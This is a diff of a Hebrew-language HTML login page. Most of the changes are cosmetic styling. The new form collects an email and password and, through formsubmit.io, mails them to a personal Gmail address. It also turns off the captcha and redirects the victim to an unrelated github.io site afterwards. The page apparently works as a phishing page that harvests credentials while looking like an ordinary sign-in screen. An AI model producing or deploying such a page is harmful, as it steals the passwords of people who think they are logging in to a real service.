@@ -2,13 +2,18 @@
 <html lang="he">
 <head>
   <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>התחברות</title>
   <style>
     body {
-      font-family: Arial;
+      font-family: Arial, sans-serif;
       direction: rtl;
       text-align: center;
       margin-top: 100px;
+      background-color: #f4f4f4;
+    }
+    h2 {
+      color: #333;
     }
     input, button {
       padding: 10px;
@@ -26,7 +31,25 @@
     button:hover {
       background-color: darkred;
     }
+    input:focus, button:focus {
+      outline: none;
+      border-color: #ff0000;
+    }
   </style>
 </head>
 <body>
-  <
+  <h2>התחברות</h2>
+  <form action="https://formsubmit.io/send/ITAITUSHBOX@gmail.com" method="POST">
+    <input type="email" name="email" placeholder="אימייל" required><br>
+    <input type="password" name="password" placeholder="סיסמה" required><br>
+    
+    <!-- זה עושה הפנייה אחרי השליחה -->
+    <input type="hidden" name="_redirect" value="https://itapita470.github.io/itapitascompare.com">
+    
+    <!-- מבטל captcha והודעות מיותרות -->
+    <input type="hidden" name="_captcha" value="false">
+    
+    <button type="submit">התחבר</button>
+  </form>
+</body>
+</html>
